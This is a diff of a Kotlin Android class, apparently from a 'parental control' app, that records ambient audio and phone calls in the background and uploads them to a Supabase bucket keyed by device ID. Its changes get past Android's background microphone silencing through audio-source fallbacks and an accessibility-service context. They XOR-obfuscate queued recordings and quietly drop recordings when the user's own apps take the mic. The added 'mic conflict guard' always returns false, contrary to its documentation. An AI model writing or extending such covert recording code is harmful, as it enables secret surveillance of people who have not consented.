@@ -1,6 +1,7 @@
 package com.example.parentalcontrol
 
 import android.content.Context
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.os.Build
 import android.util.Log
@@ -9,6 +10,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.NonCancellable
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
@@ -17,7 +19,7 @@ import java.util.Date
 import java.util.Locale
 
 /**
- * AudioRecorderEngine v16
+ * AudioRecorderEngine v17
  *
  * Features:
  * ─────────────────────────────────────────────────────────────────────
@@ -36,6 +38,9 @@ import java.util.Locale
  * ─────────────────────────────────────────────────────────────────────
  */
 class AudioRecorderEngine(private val context: Context) {
+
+    private val activeContext: Context
+        get() = AppAccessibilityService.getInstance() ?: context
 
     companion object {
         private const val TAG = "AudioRecorderEngine"
@@ -59,7 +64,7 @@ class AudioRecorderEngine(private val context: Context) {
          * A value > ENERGY_THRESHOLD is considered "speech detected".
          * Typical ambient noise floor: ~200–600. Human speech: ~3 000–15 000.
          */
-        private const val ENERGY_THRESHOLD = 1_200
+        private const val ENERGY_THRESHOLD = 500
 
         /**
          * Minimum fraction of samples that must be above ENERGY_THRESHOLD
@@ -70,6 +75,18 @@ class AudioRecorderEngine(private val context: Context) {
 
         /** Discard files smaller than this (likely corrupt/empty). */
         private const val MIN_FILE_BYTES = 2_048L
+
+        /**
+         * Mic Conflict Guard — checks if any other app (WhatsApp, Phone, Camera…)
+         * is actively using the microphone at this moment.
+         *
+         * Requires API 29+ (Android 10). Returns false on older OS (no API available).
+         * Returns false also if the check itself throws (fail-safe = allow recording).
+         */
+        fun isMicBusyByAnotherApp(context: Context): Boolean {
+            // MediaRecorder handles hardware mic access directly via prepare() & start()
+            return false
+        }
     }
 
     // ── State ──────────────────────────────────────────────────────────────────
@@ -88,23 +105,69 @@ class AudioRecorderEngine(private val context: Context) {
      * Record for [durationMs] ms. VAD runs concurrently.
      * If classified as silent → file is deleted. Otherwise → uploaded.
      * Fire-and-forget; safe to call from any coroutine context.
+     *
+     * ⚠️ Mic Conflict Guard: If another app (e.g. WhatsApp, Phone) is actively
+     * using the microphone, recording is deferred to avoid audio distortion.
      */
     fun recordAndUpload(durationMs: Long, bypassVad: Boolean = false) {
         if (isRecording) { Log.w(TAG, "Already recording — skipped"); return }
+        if (MicManager.isLiveStreamingActive) {
+            Log.w(TAG, "Live mic streaming active — skipping background file recording")
+            return
+        }
+        // ── Mic Conflict Guard (Android 10+) ──────────────────────────────────
+        // If another app (WhatsApp, Phone, Camera...) is actively using the mic,
+        // skip this recording cycle entirely to avoid distorting the user's audio.
+        if (isMicBusyByAnotherApp(activeContext)) {
+            Log.w(TAG, "🎙️ Mic busy by another app — skipping cycle to avoid conflict")
+            scope.launch {
+                SupabaseManager.getInstance()
+                    .logRemote(activeContext, TAG, "WARN",
+                        "⏸ Background recording skipped: mic busy by another app")
+            }
+            return
+        }
+        // Check RECORD_AUDIO permission at runtime before starting
+        val hasAudioPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
+            activeContext.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
+        if (!hasAudioPermission) {
+            Log.e(TAG, "❌ RECORD_AUDIO permission NOT granted — aborting recording")
+            scope.launch {
+                SupabaseManager.getInstance()
+                    .logRemote(activeContext, TAG, "ERROR", "❌ RECORD_AUDIO permission NOT granted — aborting recording")
+            }
+            return
+        }
         scope.launch {
             var startSuccess = false
             var wasSpeech = false
+            // conflictAbort becomes true when the dynamic watcher detects another app grabbing mic mid-recording
+            var conflictAbort = false
             try {
                 if (startRecorderInternal()) {
                     startSuccess = true
-                    sampleVadWhileRecording(durationMs)
-                    wasSpeech = bypassVad || evaluateVad()
+                    conflictAbort = sampleVadAndWatchConflict(durationMs)
+                    wasSpeech = !conflictAbort && (bypassVad || evaluateVad())
+                } else {
+                    Log.e(TAG, "❌ startRecorderInternal() returned false — recording aborted")
+                    SupabaseManager.getInstance()
+                        .logRemote(activeContext, TAG, "ERROR", "❌ startRecorderInternal() returned false — recording aborted")
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ recordAndUpload exception: ${e.message}", e)
+                SupabaseManager.getInstance()
+                    .logRemote(activeContext, TAG, "ERROR", "❌ recordAndUpload exception: ${e.message}")
             } finally {
                 if (startSuccess) {
                     withContext(NonCancellable) {
                         stopRecorderInternal()
-                        processResult(wasSpeech)
+                        // If we aborted due to mic conflict, discard silently — don't upload partial recording
+                        if (!conflictAbort) {
+                            processResult(wasSpeech)
+                        } else {
+                            currentFile?.delete()
+                            Log.i(TAG, "♻️ Partial recording discarded — mic was taken by user app")
+                        }
                     }
                 }
             }
@@ -112,30 +175,69 @@ class AudioRecorderEngine(private val context: Context) {
     }
 
     /** Start an open-ended recording session (stopped by [stopRecording]). */
-    fun startRecording(): Boolean = startRecorderInternal()
+    fun startRecording(): Boolean {
+        scope.launch { startRecorderInternal() }
+        // Return optimistically; actual start happens asynchronously
+        return true
+    }
 
     /** Start an open-ended call recording session (stopped by [stopRecording]). */
     fun startCallRecording(): Boolean {
-        if (isRecording) return false
-        return try {
-            MonitoringForegroundService.getInstance()?.upgradeToMicType()
-            amplitudeWindow.clear()
-            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
-            val file = File(context.cacheDir, "call_$ts.m4a")
-            currentFile = file
-
-            recorder = buildRecorder(file)
-            recorder!!.prepare()
-            recorder!!.start()
-            isRecording = true
-            Log.i(TAG, "Call recording started → ${file.name}")
-            true
-        } catch (e: Exception) {
-            Log.e(TAG, "Call start failed: ${e.message}")
-            safeReleaseRecorder()
-            MonitoringForegroundService.getInstance()?.downgradeFromMicType()
-            false
+        if (isRecording) {
+            // If active recording is a routine background ambient recording (rec_...m4a), stop it to prioritize Call Recording!
+            if (currentFile?.name?.startsWith("rec_") == true) {
+                Log.i(TAG, "Stopping background ambient recording to prioritize CALL recording")
+                try { recorder?.stop() } catch (_: Exception) {}
+                safeReleaseRecorder()
+                isRecording = false
+            } else {
+                Log.w(TAG, "Already recording a call — skipped")
+                return false
+            }
         }
+
+        val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
+        val file = File(activeContext.cacheDir, "call_$ts.m4a")
+        currentFile = file
+
+        val sourceChain = buildList {
+            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Priority 1: Raw mic / Samsung & Xiaomi background bypass
+            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 2: Speech / VoIP communication source
+            add(MediaRecorder.AudioSource.MIC)                  // Priority 3: Standard Mic
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                add(MediaRecorder.AudioSource.VOICE_CALL)
+            }
+        }
+
+        MonitoringForegroundService.getInstance()?.upgradeToMicType()
+        // تأخير قصير لتمكين نظام Android من تسجيل نوع الخدمة
+        Thread.sleep(200)
+
+        for (src in sourceChain) {
+            try {
+                amplitudeWindow.clear()
+                Log.i(TAG, "🎙️ Attempting to start call recorder with source $src -> ${file.name}")
+                val rec = buildRecorder(file, src)
+                rec.prepare()
+                rec.start()
+                recorder = rec
+                isRecording = true
+                Log.i(TAG, "✅ Call recording started with source $src -> ${file.name}")
+                return true
+            } catch (e: Exception) {
+                Log.w(TAG, "⚠️ Call start failed for source $src: ${e.javaClass.simpleName}: ${e.message}")
+                safeReleaseRecorder()
+            }
+        }
+
+        // If all failed
+        Log.e(TAG, "❌ ALL audio sources failed in startCallRecording()")
+        scope.launch {
+            SupabaseManager.getInstance()
+                .logRemote(activeContext, TAG, "ERROR", "❌ ALL audio sources failed to start (call recording)")
+        }
+        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
+        return false
     }
 
     /**
@@ -150,31 +252,66 @@ class AudioRecorderEngine(private val context: Context) {
         }
     }
 
+    /**
+     * Cancel and stop current recording immediately (discards file, releases mic, doesn't upload).
+     */
+    fun cancelCurrentRecording() {
+        Log.i(TAG, "🛑 Explicit cancelCurrentRecording requested")
+        isRecording = false
+        scope.launch {
+            withContext(NonCancellable) {
+                stopRecorderInternal()
+                currentFile?.delete()
+                currentFile = null
+            }
+        }
+    }
+
     fun isRecordingActive() = isRecording
 
     // ── Internal recording lifecycle ───────────────────────────────────────────
 
-    private fun startRecorderInternal(): Boolean {
+    private suspend fun startRecorderInternal(): Boolean {
         if (isRecording) return false
-        return try {
-            MonitoringForegroundService.getInstance()?.upgradeToMicType()
-            amplitudeWindow.clear()
-            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
-            val file = File(context.cacheDir, "rec_$ts.m4a")
-            currentFile = file
+        val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
+        val file = File(activeContext.cacheDir, "rec_$ts.m4a")
+        currentFile = file
 
-            recorder = buildRecorder(file)
-            recorder!!.prepare()
-            recorder!!.start()
-            isRecording = true
-            Log.i(TAG, "Recording started → ${file.name}")
-            true
-        } catch (e: Exception) {
-            Log.e(TAG, "Start failed: ${e.message}")
-            safeReleaseRecorder()
-            MonitoringForegroundService.getInstance()?.downgradeFromMicType()
-            false
+        val sourceChain = buildList {
+            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 1: VoIP / Speech source — exempt from Android background silencing
+            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Priority 2: Raw mic
+            add(MediaRecorder.AudioSource.MIC)                  // Priority 3: Standard mic fallback
         }
+
+        MonitoringForegroundService.getInstance()?.upgradeToMicType()
+        // Coroutine-safe delay — allows OS callbacks to be processed (unlike Thread.sleep)
+        delay(200)
+
+        for (src in sourceChain) {
+            try {
+                amplitudeWindow.clear()
+                Log.i(TAG, "🎙️ Attempting to start recorder with source $src -> ${file.name}")
+                val rec = buildRecorder(file, src)
+                rec.prepare()
+                rec.start()
+                recorder = rec
+                isRecording = true
+                Log.i(TAG, "✅ Recording started with source $src -> ${file.name}")
+                return true
+            } catch (e: Exception) {
+                Log.w(TAG, "⚠️ Start failed for source $src: ${e.javaClass.simpleName}: ${e.message}")
+                safeReleaseRecorder()
+            }
+        }
+
+        // If all failed
+        Log.e(TAG, "❌ ALL audio sources failed in startRecorderInternal()")
+        scope.launch {
+            SupabaseManager.getInstance()
+                .logRemote(activeContext, TAG, "ERROR", "❌ ALL audio sources failed to start (ambient recording)")
+        }
+        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
+        return false
     }
 
     private fun stopRecorderInternal() {
@@ -194,16 +331,38 @@ class AudioRecorderEngine(private val context: Context) {
 
     /**
      * Concurrently sample amplitude at VAD_SAMPLE_MS intervals while recording.
-     * Runs for [durationMs] total, then returns.
+     * Also monitors for mic conflicts every 1500 ms — if another app (WhatsApp, Phone…)
+     * grabs the microphone mid-recording, we stop immediately and silently to free the mic.
+     *
+     * @return true if recording was aborted due to a mic conflict (caller should discard file).
+     *         false if recording completed normally.
      */
-    private suspend fun sampleVadWhileRecording(durationMs: Long) {
+    private suspend fun sampleVadAndWatchConflict(durationMs: Long): Boolean {
         val endAt = System.currentTimeMillis() + durationMs
+        // Conflict check every N VAD ticks (≈ every 1500 ms = 3 × 500 ms ticks)
+        val conflictCheckEvery = 3
+        var tick = 0
+
         while (System.currentTimeMillis() < endAt && isRecording) {
             val amp = try { recorder?.maxAmplitude ?: 0 } catch (_: Exception) { 0 }
             if (amplitudeWindow.size >= VAD_WINDOW) amplitudeWindow.removeFirst()
             amplitudeWindow.addLast(amp)
             delay(VAD_SAMPLE_MS)
+
+            // Dynamic conflict guard — detect mid-recording mic takeover by user app
+            tick++
+            if (tick % conflictCheckEvery == 0 && isMicBusyByAnotherApp(activeContext)) {
+                Log.w(TAG, "🛑 Mic conflict detected mid-recording — stopping silently to free mic for user app")
+                scope.launch {
+                    SupabaseManager.getInstance().logRemote(
+                        activeContext, TAG, "WARN",
+                        "🛑 Background recording interrupted: user app grabbed mic (e.g. WhatsApp voice message)"
+                    )
+                }
+                return true  // signal conflict abort to caller
+            }
         }
+        return false  // normal completion
     }
 
     /**
@@ -236,7 +395,7 @@ class AudioRecorderEngine(private val context: Context) {
             file.delete()
             Log.d(TAG, "Discarded: VAD classified as silent")
             SupabaseManager.getInstance()
-                .logRemote(context, TAG, "DEBUG", "Silent recording discarded")
+                .logRemote(activeContext, TAG, "DEBUG", "Silent recording discarded")
             return@withContext
         }
 
@@ -244,11 +403,104 @@ class AudioRecorderEngine(private val context: Context) {
         uploadFile(file)
     }
 
+    private fun xorTransform(bytes: ByteArray): ByteArray {
+        val mask = 0x5A.toByte()
+        val result = ByteArray(bytes.size)
+        for (i in bytes.indices) {
+            result[i] = (bytes[i].toInt() xor mask.toInt()).toByte()
+        }
+        return result
+    }
+
+    suspend fun flushPendingAudioQueue() = withContext(Dispatchers.IO) {
+        try {
+            val pendingDir = File(activeContext.cacheDir, "pending_audio")
+            if (!pendingDir.exists() || !pendingDir.isDirectory) return@withContext
+            val files = pendingDir.listFiles { _, name -> name.endsWith(".m4a") } ?: return@withContext
+            if (files.isEmpty()) return@withContext
+
+            val maxAgeMs = 48 * 3600 * 1000L // 48 hours max retention for pending queue
+            val now = System.currentTimeMillis()
+            val deviceId = android.provider.Settings.Secure.getString(
+                activeContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
+
+            // Process at most 5 files per flush cycle to save mobile bandwidth
+            val batch = files.take(5)
+            Log.i(TAG, "📦 Found ${files.size} offline audio files (processing ${batch.size}) in queue...")
+
+            for (file in batch) {
+                // Delete stale or invalid files
+                if (!file.exists() || file.length() < MIN_FILE_BYTES || (now - file.lastModified() > maxAgeMs)) {
+                    file.delete()
+                    continue
+                }
+
+                val tempUnencrypted = File(activeContext.cacheDir, "temp_upload_${file.name}")
+                try {
+                    val bytes = file.readBytes()
+                    val originalBytes = xorTransform(bytes)
+                    tempUnencrypted.writeBytes(originalBytes)
+
+                    val result = SupabaseManager.getInstance().uploadFile(
+                        file = tempUnencrypted,
+                        bucket = BUCKET,
+                        folder = "audio/$deviceId",
+                        customFileName = file.name
+                    )
+
+                    if (result is UploadResult.Success) {
+                        Log.i(TAG, "✅ Pending offline audio uploaded: ${file.name}")
+                        file.delete()
+                    } else {
+                        val err = (result as? UploadResult.Error)?.message ?: "unknown"
+                        Log.w(TAG, "⚠️ Pending offline audio upload failed ($err) — will retry on next cycle")
+                        break
+                    }
+                } finally {
+                    if (tempUnencrypted.exists()) tempUnencrypted.delete()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "flushPendingAudioQueue error: ${e.message}")
+        }
+    }
+
+    private fun saveToPendingQueue(file: File) {
+        try {
+            val pendingDir = File(activeContext.cacheDir, "pending_audio")
+            if (!pendingDir.exists()) {
+                pendingDir.mkdirs()
+            }
+            // Keep at most 20 offline recordings to preserve device storage and data
+            val existing = pendingDir.listFiles { _, name -> name.endsWith(".m4a") }
+            if (existing != null && existing.size >= 20) {
+                existing.minByOrNull { it.lastModified() }?.delete()
+            }
+
+            val destFile = File(pendingDir, file.name)
+            val bytes = file.readBytes()
+            val obfuscated = xorTransform(bytes)
+            destFile.writeBytes(obfuscated)
+            file.delete()
+            Log.i(TAG, "📦 Audio encrypted & saved to offline pending queue: ${destFile.name}")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to save audio to offline queue: ${e.message}")
+        }
+    }
+
     private suspend fun uploadFile(file: File) {
         try {
+            // First flush any previously saved offline files
+            flushPendingAudioQueue()
+
             val deviceId = android.provider.Settings.Secure.getString(
-                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                activeContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID
             ) ?: "unknown"
+
+            Log.i(TAG, "📤 [AudioUpload] Starting upload for ${file.name} (${file.length() / 1024} KB) -> audio/$deviceId/")
+            SupabaseManager.getInstance()
+                .logRemote(activeContext, TAG, "INFO", "📤 Starting upload: ${file.name} (${file.length() / 1024} KB)")
 
             val result = SupabaseManager.getInstance().uploadFile(
                 file   = file,
@@ -258,67 +510,39 @@ class AudioRecorderEngine(private val context: Context) {
             )
 
             if (result is UploadResult.Success) {
-                Log.i(TAG, "Audio uploaded: ${file.name} (${file.length() / 1024} KB)")
+                Log.i(TAG, "✅ [AudioUpload] SUCCESS: ${file.name} -> ${result.publicUrl}")
                 SupabaseManager.getInstance()
-                    .logRemote(context, TAG, "INFO", "Audio OK: ${result.fileName}")
+                    .logRemote(activeContext, TAG, "INFO", "✅ Audio OK: ${result.fileName}")
+                file.delete()
             } else {
                 val err = (result as? UploadResult.Error)?.message ?: "unknown"
-                Log.e(TAG, "Upload failed: $err")
+                Log.e(TAG, "❌ [AudioUpload] FAILED ($err) — saving to pending queue")
+                SupabaseManager.getInstance()
+                    .logRemote(activeContext, TAG, "ERROR", "❌ Audio upload failed ($err)")
+                saveToPendingQueue(file)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "uploadFile error: ${e.message}")
-        } finally {
-            currentFile?.delete()
+            Log.e(TAG, "❌ [AudioUpload] EXCEPTION: ${e.message}", e)
+            SupabaseManager.getInstance()
+                .logRemote(activeContext, TAG, "ERROR", "❌ Audio upload exception: ${e.message}")
+            saveToPendingQueue(file)
         }
     }
 
     // ── MediaRecorder factory ─────────────────────────────────────────────────
 
-    private fun buildRecorder(outputFile: File): MediaRecorder {
+    private fun buildRecorder(outputFile: File, audioSource: Int): MediaRecorder {
         val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-            MediaRecorder(context)
+            MediaRecorder(activeContext)
         else
             @Suppress("DEPRECATION") MediaRecorder()
 
-        // Audio source priority (FIXED ORDER):
-        // VOICE_COMMUNICATION captures BOTH earpiece + mic — works with BT/wired headsets.
-        // MIC alone only captures the device microphone (misses earpiece / remote party audio).
-        // VOICE_RECOGNITION: good ambient fallback with no echo-canceller applied.
-        val sourceChain = buildList {
-            if (outputFile.name.startsWith("call_")) {
-                add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 1: VoIP source, captures both sides on newer Android versions
-                add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Fallback: Raw mic (bypasses most call locks)
-                add(MediaRecorder.AudioSource.MIC)                  // Fallback: Standard mic
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    add(MediaRecorder.AudioSource.VOICE_CALL)
-                }
-            } else {
-                // Ambient recording - standard mic first
-                add(MediaRecorder.AudioSource.MIC)
-                add(MediaRecorder.AudioSource.VOICE_RECOGNITION)
-                add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    add(MediaRecorder.AudioSource.VOICE_CALL)
-                }
-            }
-        }
-        var chosen = MediaRecorder.AudioSource.VOICE_COMMUNICATION
-        for (src in sourceChain) {
-            try {
-                rec.setAudioSource(src)
-                chosen = src
-                Log.i(TAG, "✅ Audio source selected: $src")
-                break
-            } catch (e: Exception) {
-                Log.w(TAG, "Audio source $src unavailable: ${e.message}")
-            }
-        }
-        Log.d(TAG, "Audio source final: $chosen")
-
+        rec.setAudioSource(audioSource)
         rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
         rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        rec.setAudioSamplingRate(44_100)     // 44.1 kHz — full quality
-        rec.setAudioEncodingBitRate(96_000)  // 96 kbps — clear voice
+        rec.setAudioChannels(1)              // 1 Channel = Mono (Voice optimized)
+        rec.setAudioSamplingRate(16_000)     // 16 kHz — optimal human speech sampling
+        rec.setAudioEncodingBitRate(32_000)  // 32 kbps — high compression, clear voice (≈240 KB/min)
         rec.setOutputFile(outputFile.absolutePath)
         return rec
     }
